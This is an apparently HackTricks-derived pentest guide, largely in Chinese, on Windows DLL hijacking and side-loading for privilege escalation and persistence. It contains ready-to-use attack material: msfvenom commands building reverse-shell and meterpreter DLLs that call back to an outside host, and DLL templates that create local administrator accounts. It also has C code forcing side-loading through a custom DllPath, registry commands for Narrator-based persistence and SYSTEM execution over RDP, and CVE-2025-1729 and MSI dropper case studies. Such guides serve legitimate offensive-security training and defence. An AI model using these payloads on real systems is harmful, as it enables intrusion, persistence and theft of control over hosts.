# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## 基本信息

DLL Hijacking 涉及操纵受信任的应用程序加载恶意 DLL。这个术语包含多种策略，例如 **DLL Spoofing, Injection, and Side-Loading**。它主要用于代码执行、实现持久性，以及在较少情况下用于权限提升。尽管这里侧重于提权，劫持的方法在不同目标间是一致的。

### 常见技术

几种方法可用于 DLL hijacking，其有效性取决于应用程序的 DLL 加载策略：

1. **DLL Replacement**: 用恶意 DLL 替换真实 DLL，或者使用 DLL Proxying 来保留原始 DLL 的功能。
2. **DLL Search Order Hijacking**: 将恶意 DLL 放在合法 DLL 之前的搜索路径中，利用应用程序的搜索模式。
3. **Phantom DLL Hijacking**: 为应用创建一个恶意 DLL，使其以为这是一个不存在的必需 DLL 并加载它。
4. **DLL Redirection**: 修改搜索参数（如 %PATH% 或 .exe.manifest / .exe.local 文件）以将应用指向恶意 DLL。
5. **WinSxS DLL Replacement**: 在 WinSxS 目录中将合法 DLL 替换为恶意版本，这种方法通常与 DLL side-loading 相关。
6. **Relative Path DLL Hijacking**: 将恶意 DLL 放在与复制的应用程序一起的用户可控目录中，类似于 Binary Proxy Execution 技术。

## 查找缺失的 Dlls

在系统中查找缺失 Dlls 最常见的方法是运行 [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon)（来自 sysinternals），并**设置**以下**2 个过滤器**：

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

然后只显示 **File System Activity**：

![](<../../../images/image (153).png>)

如果你在查找 **missing dlls in general**，请让它运行几 **seconds**。\
如果你要查找特定可执行文件中的 **missing dll inside an specific executable**，应设置 **另一个过滤器，例如 "Process Name" "contains" `<exec name>`，执行该程序，然后停止捕获事件**。

## Exploiting Missing Dlls

为了提权，我们最好的机会是能够在某些将被搜索的地方写入一个特权进程会尝试加载的 **write a dll that a privilege process will try to load**。因此，我们可以在一个有写权限的 **folder** 中 **write** 一个 dll，该文件夹在搜索顺序中位于 **dll is searched before** 原始 **dll** 所在的文件夹之前（特殊情况）；或者我们可以在某个将被搜索的 **folder** 上写入恶意 dll，而原始 **dll doesn't exist** 在任何文件夹中。

### Dll Search Order

**Inside the** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **you can find how the Dlls are loaded specifically.**

Windows 应用按一系列预定义的搜索路径并遵循特定顺序查找 DLL。当恶意 DLL 被策略性地放在这些目录之一并在真实 DLL 之前被加载时，就会发生 DLL hijacking。防止此类问题的一种方法是确保应用在引用所需 DLL 时使用绝对路径。

你可以在下面看到 **DLL search order on 32-bit** 系统：

1. The directory from which the application loaded.
2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
1. (_C:\Windows_)
5. The current directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

以上是在启用 **SafeDllSearchMode** 时的默认搜索顺序。当其被禁用时，当前目录会提升到第二位。要禁用此功能，请创建注册表项 **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\\SafeDllSearchMode** 并将其设置为 0（默认启用）。

如果以 **LOAD_WITH_ALTERED_SEARCH_PATH** 调用 [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa)，搜索将从 LoadLibraryEx 正在加载的可执行模块的目录开始。

最后，请注意，**a dll could be loaded indicating the absolute path instead just the name**。在这种情况下，该 dll **仅会在该路径中被搜索**（如果该 dll 有任何依赖项，它们将按名称像被加载一样被搜索）。

还有其他方法可以改变搜索顺序，但这里不再详述。

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

An advanced way to deterministically influence the DLL search path of a newly created process is to set the DllPath field in RTL_USER_PROCESS_PARAMETERS when creating the process with ntdll’s native APIs. By supplying an attacker-controlled directory here, a target process that resolves an imported DLL by name (no absolute path and not using the safe loading flags) can be forced to load a malicious DLL from that directory.

关键思路
- 使用 RtlCreateProcessParametersEx 构建进程参数，并提供指向你可控文件夹的自定义 DllPath（例如，你的 dropper/unpacker 所在目录）。
- 使用 RtlCreateUserProcess 创建进程。当目标二进制按名称解析 DLL 时，加载器将在解析期间查阅所提供的 DllPath，从而在恶意 DLL 未与目标 EXE 同置的情况下实现可靠的 sideloading。

注意/限制
- 这只影响被创建的子进程；与 SetDllDirectory（仅影响当前进程）不同。
- 目标必须按名称导入或通过 LoadLibrary 加载 DLL（不能是绝对路径，且不能使用 LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories）。
- KnownDLLs 和硬编码的绝对路径无法被劫持。转发导出和 SxS 可能改变优先级。

Minimal C example (ntdll, wide strings, simplified error handling):

<details>
<summary>Full C example: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

操作使用示例
- 将恶意 xmllite.dll（导出所需函数或代理真实的那个）放入你的 DllPath 目录。
- 启动已知会按名称查找 xmllite.dll 的 signed binary，使用上述技术。loader 会通过提供的 DllPath 解析该导入并 sideloads 你的 DLL。

该技术已在实战中被观察到用于驱动多阶段 sideloading 链：初始 launcher 投放一个 helper DLL，随后它会生成一个 Microsoft-signed、可 hijack 的二进制，使用自定义 DllPath 强制从一个 staging directory 加载攻击者的 DLL。


#### Exceptions on dll search order from Windows docs

Windows 文档中指出了对标准 DLL 搜索顺序的若干例外：

- 当一个 **与内存中已加载的 DLL 同名的 DLL** 被遇到时，系统会绕过通常的搜索。它会先检查重定向和 manifest，然后默认使用内存中的那个 DLL。**在这种情况下，系统不会对该 DLL 进行搜索**。
- 如果某个 DLL 被识别为当前 Windows 版本的 **known DLL**，系统将使用其自身的 known DLL 版本以及任何依赖的 DLL，**省略搜索过程**。注册表键 **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** 包含这些 known DLL 的列表。
- 如果某个 **DLL 有依赖项**，对这些依赖 DLL 的搜索将像它们仅通过 **module names** 指定一样进行，无论初始 DLL 是否通过完整路径被标识。

### 提权

**要求**：

- 识别一个以 **不同权限**（横向或侧向移动）运行或将要以不同权限运行的进程，该进程 **缺少 DLL**。
- 确保对将要搜索 DLL 的任意 **目录** 拥有 **写入权限**。该位置可能是可执行文件所在目录或系统路径中的一个目录。

是的，这些先决条件很难找到，**默认情况下要找到一个缺少 dll 的有特权的可执行文件有点奇怪**，而且在系统路径文件夹上拥有写权限就更**奇怪**（默认情况下你无法做到）。但在配置错误的环境中这是可能的。\
如果你足够幸运且满足这些条件，可以查看 [UACME](https://github.com/hfiref0x/UACME) 项目。即便该项目的**主要目标是 bypass UAC**，你也可能在其中找到针对你所用 Windows 版本的 Dll hijacking 的 **PoC**（可能只需更改你有写权限的文件夹路径即可使用）。

注意你可以通过以下命令**检查在某个文件夹中的权限**：
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
并**检查 PATH 中所有文件夹的权限**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
你也可以检查 executable 的 imports 和 dll 的 exports：
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
要查看在具有向 **System Path** 文件夹写入权限的情况下，如何**滥用 Dll Hijacking 来提权**的完整指南，请参见：


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### 自动化工具

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)will check if you have write permissions on any folder inside system PATH.\
其他用于发现此漏洞的自动化工具还包括 **PowerSploit functions**：_Find-ProcessDLLHijack_、_Find-PathDLLHijack_ 和 _Write-HijackDll_。

### 示例

如果你发现了可利用的场景，成功利用它最重要的事情之一是**创建一个至少导出该可执行文件将从中导入的所有函数的 dll**。另外，注意到 Dll Hijacking 在 [escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) 或从 [ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system) 时非常有用。你可以在这个针对执行的 dll hijacking 研究中找到一个**如何创建有效 dll**的示例： [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
此外，在**下一节**中你可以找到一些**基本 dll 代码**，可用作**模板**或用于创建**导出非必需函数的 dll**。

## **创建和编译 Dlls**

### **Dll Proxifying**

基本上，**Dll proxy** 是一个能在加载时**执行你的恶意代码**的 Dll，同时还能通过将所有调用转发给真实库来**暴露并按预期工作**。

使用工具 [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) 或 [**Spartacus**](https://github.com/Accenture/Spartacus)，你可以**指定一个可执行文件并选择要 proxify 的库**来**生成一个 proxified dll**，或者**指定该 Dll**并**生成一个 proxified dll**。

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**获取一个 meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**创建一个用户（x86 我没看到 x64 版本）：**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### 你自己的

注意，在多种情况下，你编译的 Dll 必须 **export several functions**，这些函数会被 victim process 加载；如果这些函数不存在，**binary won't be able to load** 它们，且 **exploit will fail**。

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>C++ DLL 示例（包含用户创建）</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>带线程入口的替代 C DLL</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## 案例研究： Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe 仍然在启动时探测一个可预测的、语言特定的 localization DLL，该 DLL 可以被 hijacked 用于 arbitrary code execution 和 persistence。

Key facts
- Probe path (current builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy path (older builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- If a writable attacker-controlled DLL exists at the OneCore path, it is loaded and `DllMain(DLL_PROCESS_ATTACH)` executes. No exports are required.

Discovery with Procmon
- Filter: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Start Narrator and observe the attempted load of the above path.

Minimal DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC 静默
- 一个简单的 hijack 会发声/高亮 UI。为保持静默，在 attach 时枚举 Narrator 线程，打开主线程 (`OpenThread(THREAD_SUSPEND_RESUME)`) 并 `SuspendThread` 它；在你自己的线程中继续。完整代码见 PoC。

Trigger and persistence via Accessibility configuration
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- 有了上述设置，启动 Narrator 会加载被植入的 DLL。在 secure desktop（登录屏幕）上，按 CTRL+WIN+ENTER 启动 Narrator。

RDP-triggered SYSTEM execution (lateral movement)
- Allow classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- RDP 到主机，在登录屏幕按 CTRL+WIN+ENTER 启动 Narrator；你的 DLL 会在 secure desktop 上以 SYSTEM 身份执行。
- 当 RDP 会话关闭时执行会停止——请迅速注入/迁移。

Bring Your Own Accessibility (BYOA)
- 你可以克隆一个内置的 Accessibility Tool (AT) 注册表条目（例如 CursorIndicator），编辑它以指向任意二进制/DLL，导入后将 `configuration` 设置为该 AT 名称。这样可以在 Accessibility 框架下代理任意执行。

Notes
- 在 `%windir%\System32` 下写入并修改 HKLM 值需要管理员权限。
- 所有 payload 逻辑都可以放在 `DLL_PROCESS_ATTACH` 中；不需要导出函数。

## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

本案例演示 Lenovo 的 TrackPoint Quick Menu (`TPQMAssistant.exe`) 中的 **Phantom DLL Hijacking**，追踪为 **CVE-2025-1729**。

### Vulnerability Details

- **Component**: `TPQMAssistant.exe` 位于 `C:\ProgramData\Lenovo\TPQM\Assistant\`。
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` 每天 9:30 AM 在已登录用户上下文中运行。
- **Directory Permissions**: 对 `CREATOR OWNER` 可写，允许本地用户放置任意文件。
- **DLL Search Behavior**: 会优先尝试从其工作目录加载 `hostfxr.dll`，若缺失会记录 "NAME NOT FOUND"，表明本地目录搜索具有优先权。

### Exploit Implementation

攻击者可以在相同目录下放置一个恶意的 `hostfxr.dll` 存根，利用缺失的 DLL 实现以用户上下文的代码执行：
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### 攻击流程

1. 作为标准用户，将 `hostfxr.dll` 放入 `C:\ProgramData\Lenovo\TPQM\Assistant\`。
2. 等待计划任务在当前用户的上下文下于 9:30 AM 运行。
3. 如果在任务执行时有管理员登录，恶意 DLL 会在管理员会话中以 medium integrity 运行。
4. 链接常见的 UAC bypass 技术，从 medium integrity 提权到 SYSTEM privileges。

## 案例研究：MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Threat actors 经常将基于 MSI 的 droppers 与 DLL side-loading 配对，以在受信任的已签名进程下执行 payload。

Chain overview
- 用户下载 MSI。GUI 安装期间，一个 CustomAction 在后台静默运行（例如 LaunchApplication 或 VBScript action），从嵌入的资源重构下一阶段。
- dropper 将合法的已签名 EXE 和恶意 DLL 写入同一目录（示例对：Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll）。
- 当已签名的 EXE 启动时，Windows 的 DLL 搜索顺序会优先从工作目录加载 wsc.dll，从而在已签名的父进程下执行攻击者代码（ATT&CK T1574.001）。

MSI analysis (what to look for)
- CustomAction table:
- 查找运行可执行文件或 VBScript 的条目。可疑模式示例：LaunchApplication 在后台执行嵌入文件。
- 在 Orca (Microsoft Orca.exe) 中，检查 CustomAction、InstallExecuteSequence 和 Binary 表。
- MSI CAB 中的嵌入/分割 payload：
- 管理员提取： msiexec /a package.msi /qb TARGETDIR=C:\out
- 或使用 lessmsi： lessmsi x package.msi C:\out
- 查找多个小片段，这些片段由 VBScript CustomAction 串联并解密。常见流程：
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
使用 wsc_proxy.exe 的实用 sideloading
- 将这两个文件放到同一文件夹中：
- wsc_proxy.exe: legitimate signed host (Avast)。该进程尝试从其目录按名称加载 wsc.dll。
- wsc.dll: attacker DLL。如果不需要特定的导出函数，DllMain 就足够；否则，构建一个 proxy DLL 并在 DllMain 中运行 payload 的同时，将所需的导出转发到真实库。
- 构建一个最小的 DLL payload：
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- 对于导出要求，使用代理框架（例如 DLLirant/Spartacus）生成一个转发 DLL，同时执行你的 payload。

- 该技术依赖宿主二进制对 DLL 名称的解析。如果宿主使用绝对路径或安全加载标志（例如 LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories），hijack 可能会失败。
- KnownDLLs、SxS 以及 forwarded exports 会影响优先级，选择宿主二进制和导出集合时必须予以考虑。

## References

- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)


{{#include ../../../banners/hacktricks-training.md}}
